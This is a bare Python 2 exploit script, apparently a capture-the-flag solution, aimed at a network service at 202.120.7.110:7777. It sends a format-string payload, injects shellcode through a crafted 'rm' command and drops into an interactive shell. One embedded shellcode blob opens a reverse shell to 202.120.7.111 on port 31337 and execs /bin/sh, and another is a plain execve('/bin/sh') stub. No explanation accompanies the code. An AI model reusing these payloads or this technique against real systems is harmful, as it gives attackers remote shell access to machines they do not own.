import socket
import struct
import time
import telnetlib

def p(x):
    return struct.pack('<Q', x)

def up(x):
    return struct.unpack('<Q', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

host = '202.120.7.110'
port = 7777

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

raw_input('wait')

sc1 = (
"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
"\x02\x7a\x69\xc7\x44\x24\x04\xca\x78\x07\x6f\x48\x89\xe6\x6a\x10"
"\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
"\x5f\x6a\x3b\x58\x0f\x05")

#shellcode_addr = 0xb0007cb40
sc = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05\x90'

sc2 = '\x48\xbf\x41\x41\x41\x41\x41\x41\x41\x41\x48\xbe\x10\x00\x00\x00\x0a\x00\x00\x00\x48\x89\x3e\x48\x31\xff\x48\xc7\xc3\xa8\x24\x60\x00\x8b\x3b\x31\xf6\x48\xc7\xc1\x90\x1a\x40\x00\xff\xd1\x48\xbe\x00\x00\x00\x00\x0a\x00\x00\x00\x48\xc7\xc7\x5e\x00\x00\x00\x48\x89\x3e\x48\x31\xff\x48\xc7\xc3\xa8\x24\x60\x00\x8b\x3b\x31\xf6\x48\xc7\xc1\xc0\x1a\x40\x00\xff\xd1\x48\xc7\xc0\x00\x00\x00\x00\x48\x83\xf8\x00\x74\xb1'

#0xa 0003e848

#48 e8 03 00 0a 00 00 00
content = '%40$280c' + '\x0f\x11\x40'
print content

readuntil(f, 'bksh> ');
f.write('create ppp\n');
f.write(content);

readuntil(f, 'bksh> ');
f.write('rm ' + 'C' * 5 + sc2 + '\n');

readuntil(f, 'bksh> ');
f.write('cat ppp\n');

#print f.read(1024)

t = telnetlib.Telnet()
t.sock = s
t.interact()
